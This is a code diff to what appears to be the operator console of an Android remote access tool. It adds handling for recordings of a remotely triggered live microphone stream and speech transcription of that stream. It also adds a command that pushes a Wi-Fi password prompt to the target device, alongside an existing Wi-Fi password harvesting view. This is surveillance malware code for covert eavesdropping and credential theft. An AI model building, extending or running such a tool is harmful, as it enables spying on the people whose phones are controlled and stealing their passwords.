+        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
+        return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
+    }
+    
+    // Play recorded stream
+    $LiveMicCtrl.playRecording = (recording) => {
+        if (!recording || !recording.path) return;
+        
+        try {
+            // Use HTML5 audio element to play the file
+            const audio = document.createElement('audio');
+            audio.src = 'file://' + recording.path.replace(/\\/g, '/');
+            audio.controls = true;
+            audio.style.width = '100%';
+            
+            // Create a temporary container and show it
+            const container = document.createElement('div');
+            container.style.position = 'fixed';
+            container.style.top = '50%';
+            container.style.left = '50%';
+            container.style.transform = 'translate(-50%, -50%)';
+            container.style.background = 'var(--bg-primary)';
+            container.style.padding = '20px';
+            container.style.borderRadius = '8px';
+            container.style.boxShadow = '0 4px 20px rgba(0,0,0,0.3)';
+            container.style.zIndex = '10000';
+            container.style.minWidth = '400px';
+            
+            const closeBtn = document.createElement('button');
+            closeBtn.innerHTML = '×';
+            closeBtn.style.float = 'right';
+            closeBtn.style.background = 'none';
+            closeBtn.style.border = 'none';
+            closeBtn.style.fontSize = '24px';
+            closeBtn.style.cursor = 'pointer';
+            closeBtn.style.color = 'var(--text-primary)';
+            closeBtn.onclick = () => container.remove();
+            
+            container.appendChild(closeBtn);
+            container.appendChild(document.createElement('br'));
+            container.appendChild(document.createElement('br'));
+            container.appendChild(audio);
+            document.body.appendChild(container);
+            
+            audio.play().catch(e => {
+                $rootScope.Log(`[✗] Failed to play recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
+                container.remove();
+            });
+            
+            $rootScope.Log(`[→] Playing recording: ${recording.filename}`, CONSTANTS.logStatus.INFO);
+        } catch (e) {
+            $rootScope.Log(`[✗] Error playing recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
+    
+    // Open recording in file explorer
+    $LiveMicCtrl.openRecording = (recording) => {
+        if (!recording || !recording.path) return;
+        
+        try {
+            const { remote } = require('electron');
+            const shell = remote ? remote.shell : require('electron').shell;
+            
+            if (shell && shell.showItemInFolder) {
+                shell.showItemInFolder(recording.path);
+                $rootScope.Log(`[→] Opening recording location`, CONSTANTS.logStatus.INFO);
+            } else if (shell && shell.openPath) {
+                // Fallback: open the folder
+                const dir = path.dirname(recording.path);
+                shell.openPath(dir);
+                $rootScope.Log(`[→] Opening recording folder`, CONSTANTS.logStatus.INFO);
+            }
+        } catch (e) {
+            $rootScope.Log(`[✗] Failed to open recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
+    
+    // Delete recorded stream
+    $LiveMicCtrl.deleteRecording = (recording) => {
+        if (!recording || !recording.path) return;
+        
+        try {
+            fs.unlink(recording.path, (err) => {
+                if (err) {
+                    $rootScope.Log(`[✗] Failed to delete recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    // Remove from list
+                    const index = $LiveMicCtrl.recordedStreams.findIndex(r => r.id === recording.id);
+                    if (index !== -1) {
+                        $LiveMicCtrl.recordedStreams.splice(index, 1);
+                    }
+                    $rootScope.Log(`[✓] Recording deleted: ${recording.filename}`, CONSTANTS.logStatus.SUCCESS);
+                    if (!$LiveMicCtrl.$$phase) {
+                        $LiveMicCtrl.$apply();
+                    }
+                }
+            });
+        } catch (e) {
+            $rootScope.Log(`[✗] Error deleting recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
 
     // Play audio buffer
     function playAudioChunk(audioData) {
@@ -2842,16 +3701,10 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
                 arrayBuffer = audioData;
             }
             
-            // Decode and play audio
-            audioContext.decodeAudioData(arrayBuffer, function(buffer) {
-                var source = audioContext.createBufferSource();
-                source.buffer = buffer;
-                source.connect(gainNode);
-                source.start(0);
-            }, function(err) {
-                // Try raw PCM playback if decode fails
-                playRawPCM(arrayBuffer);
-            });
+            // Android sends raw PCM16 data, not encoded audio
+            // Skip decodeAudioData and go directly to PCM playback
+            // decodeAudioData will fail on raw PCM, so use playRawPCM directly
+            playRawPCM(arrayBuffer);
         } catch (e) {
             console.error('Audio playback error:', e);
         }
@@ -2907,6 +3760,20 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
         $rootScope.Log('[→] Starting live microphone stream...', CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: liveMic, action: 'start' });
         
+        // Start transcription if enabled
+        if ($LiveMicCtrl.transcriptionEnabled) {
+            if (!recognition) {
+                initTranscription();
+            }
+            if (recognition) {
+                try {
+                    recognition.start();
+                } catch (e) {
+                    // Already started or error
+                }
+            }
+        }
+        
         // Update duration timer
         streamTimer = $interval(() => {
             var elapsed = Math.floor((Date.now() - startTime) / 1000);
@@ -2919,12 +3786,21 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
                 String(seconds).padStart(2, '0');
         }, 1000);
     };
-
+    
     $LiveMicCtrl.stopStream = () => {
         $LiveMicCtrl.isStreaming = false;
         
         $rootScope.Log('[→] Stopping microphone stream...', CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: liveMic, action: 'stop' });
+        
+        // Stop transcription
+        if (recognition) {
+            try {
+                recognition.stop();
+            } catch (e) {
+                // Already stopped
+            }
+        }
         
         if (streamTimer) {
             $interval.cancel(streamTimer);
@@ -2954,11 +3830,37 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
         }
     });
 
+    // Store recorded chunks for saving
+    $LiveMicCtrl.recordedStreams = [];
+    
+    $LiveMicCtrl.saveCurrentRecording = () => {
+        if (recordedChunks.length === 0) {
+            $rootScope.Log('[✗] No recording to save', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        saveRecording();
+    };
+    
+    $LiveMicCtrl.discardCurrentRecording = () => {
+        recordedChunks = [];
+        $LiveMicCtrl.isRecording = false;
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+            try {
+                mediaRecorder.stop();
+            } catch (e) {
+                // Ignore
+            }
+        }
+        $rootScope.Log('[→] Recording discarded', CONSTANTS.logStatus.INFO);
+        $LiveMicCtrl.$apply();
+    };
+
     socket.on(liveMic, (data) => {
-        if (data.audio) {
+        if (data.audio === true && data.data) {
+            // Audio data is in data.data (base64 string)
             $LiveMicCtrl.audioChunks++;
-            // Play the received audio data
-            playAudioChunk(data.audio);
+            // Play the received audio data - data.data is base64 encoded PCM
+            playAudioChunk(data.data);
         } else if (data.started) {
             $rootScope.Log('[✓] Live microphone streaming started', CONSTANTS.logStatus.SUCCESS);
         } else if (data.stopped) {
@@ -3008,6 +3910,11 @@ app.controller("WiFiPasswordsCtrl", function ($scope, $rootScope) {
                 $rootScope.Log('[✓] Password copied to clipboard', CONSTANTS.logStatus.SUCCESS);
             });
         }
+    };
+    
+    $WiFiPwdCtrl.promptPasswordForNetwork = (ssid) => {
+        $rootScope.Log(`[→] Prompting password for network: ${ssid}...`, CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: wifiPasswords, extra: 'prompt', ssid: ssid });
     };
 
     socket.on(wifiPasswords, (data) => {
